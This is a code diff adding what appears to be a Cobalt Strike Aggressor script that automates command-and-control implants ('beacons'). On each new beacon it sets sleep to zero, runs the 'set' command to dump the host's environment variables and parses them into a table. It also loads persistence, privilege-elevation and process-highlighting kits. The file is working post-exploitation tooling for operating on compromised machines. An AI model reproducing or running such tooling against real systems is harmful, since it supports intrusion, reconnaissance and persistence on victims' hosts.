@@ -1,0 +1,45 @@
+global('%bvars');
+
+
+bind Ctrl+Right {
+            nextTab();
+}
+bind Ctrl+Left {
+            previousTab();
+}
+
+
+on beacon_initial {
+	bsleep($1,0);
+	bshell($1,"set");
+
+}
+
+# parse environment vars from beacon output
+on beacon_output {
+        # do nothing if we already know the env variables
+        if ($1 in %bvars) { 
+                return;
+        }
+        # verify this is output for the set command
+        else if ("*APPDATA=*" iswm $2) {
+                local('$temp $key $value');
+                foreach $temp (split("\r\n", $2)) {
+                        if ($temp ismatch '(.*?)=(.*)') {
+                                ($key, $value) = matched();
+                                %bvars[$1][$key] = $value;
+                        }
+                }
+        }
+}
+
+include(script_resource("beacon-setup.cna"));
+include(script_resource("beacon-init.cna"));
+
+include(script_resource("Ps-highlight/beacon-ps-highlight.cna"));
+include(script_resource("Idletime/beacon-idletime.cna"));
+include(script_resource("Persistence/beacon-persistence.cna"));
+include(script_resource("ElevateKit/elevate.cna"));
+
+
+
